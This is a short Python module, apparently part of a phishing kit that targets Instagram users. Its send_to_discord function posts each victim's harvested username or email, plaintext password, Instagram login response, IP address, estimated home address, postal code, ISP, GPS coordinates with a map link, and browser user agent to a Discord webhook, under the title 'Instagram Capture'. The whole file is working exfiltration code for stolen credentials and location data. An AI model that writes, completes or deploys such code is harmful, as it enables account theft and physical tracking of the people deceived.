import requests

from config import DISCORD_WEBHOOK_URL


def esc(s, limit=1000):
    s = "" if s is None else str(s).strip()
    if not s:
        return "—"
    for ch in "`*_~|>#":
        s = s.replace(ch, "\\" + ch)
    return s[:limit]


def send_to_discord(username, password, address, lat, lng, ip, ua,
                    acc="", postal="", isp="", method="IP",
                    result="—", detail=""):
    coords = f"{lat}, {lng}" + (f"  (±{acc}m)" if acc else "") if lat and lng else "—"
    embed = {
        "title": "🎣 Instagram Capture",
        "color": 0xE1306C,
        "fields": [
            {"name": "判定", "value": result, "inline": False},
            {"name": "メール / ユーザー名", "value": esc(username), "inline": False},
            {"name": "パスワード", "value": esc(password), "inline": False},
            {"name": "Instagram応答", "value": esc(detail, 300), "inline": False},
            {"name": "IP", "value": esc(ip), "inline": True},
            {"name": "取得方法", "value": method, "inline": True},
            {"name": "推定住所", "value": esc(address), "inline": False},
            {"name": "郵便番号", "value": esc(postal), "inline": True},
            {"name": "ISP / 回線", "value": esc(isp), "inline": True},
            {"name": "座標", "value": esc(coords), "inline": False},
            {"name": "地図", "value": f"https://www.google.com/maps?q={lat},{lng}" if lat and lng else "—", "inline": False},
            {"name": "UA", "value": esc(ua, 300), "inline": False},
        ],
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
    except Exception as e:
        print(f"[discord] error: {e}")
